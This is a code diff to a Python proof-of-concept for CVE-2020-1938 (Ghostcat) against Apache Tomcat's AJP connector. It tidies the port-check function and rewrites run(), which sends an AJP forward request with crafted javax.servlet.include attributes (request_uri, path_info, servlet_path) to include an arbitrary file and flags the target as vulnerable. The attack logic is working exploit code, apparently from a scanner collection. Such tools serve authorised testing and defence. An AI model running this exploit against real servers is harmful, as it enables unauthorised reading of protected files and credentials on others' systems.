@@ -230,8 +230,6 @@ class AjpResponse(object):
         r.parse(stream)
         return r
 
-import socket
-
 def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
     fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
     fr.method = method
@@ -293,17 +291,16 @@ javax.servlet.include.servlet_path
 '''
 
 
-def islive(url,port):
-    sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+def islive(url, port):
+    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sk.settimeout(1)
     try:
-        sk.connect((url,8009))
-        # print('%s server port 8009 open!'%url)
-        return 1
+        sk.connect((url, port))
+        return True
     except Exception:
-        print('[-] %s seems no vuln about cve_2020_1938'%url)
-        pass
-    sk.close()
+        return False
+    finally:
+        sk.close()
 
 # def run(url,port):
 #     if islive(url,port)==1:
@@ -321,19 +318,25 @@ def islive(url,port):
 #             return (0,'[-] %s seems no vuln about cve_2020_1938111111'%url)
 #             # continue
 
-def run(url,port):
-    if islive(url,port)==1:
-        try:
-            t = Tomcat(url, 8009)
-            _,data = t.perform_request('/asdf',attributes=[
-                {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
-                {'name':'req_attribute','value':['javax.servlet.include.path_info',xxfile]},
-                {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
-                ])
-            return (1,'[+] [%s] is Vulnerable to cve_2020_1938 !'%url)
-            #print("".join([str(d.data) for d in data]))
-        except:
-            return (0,'[-] %s seems no vuln to cve_2020_1938111111'%url)
+def run(url, port):
+    from poc.utils import format_result
+    
+    target = f"ajp://{url}:{port}"
+    
+    if not islive(url, port):
+        return (0, "")
+    
+    try:
+        t = Tomcat(url, port)
+        _, data = t.perform_request('/asdf', attributes=[
+            {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
+            {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', xxfile]},
+            {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
+        ])
+        t.socket.close()
+        return format_result("cve_2020_1938", target, True)
+    except Exception as e:
+        return (0, "")
 
 
 if __name__=="__main__":
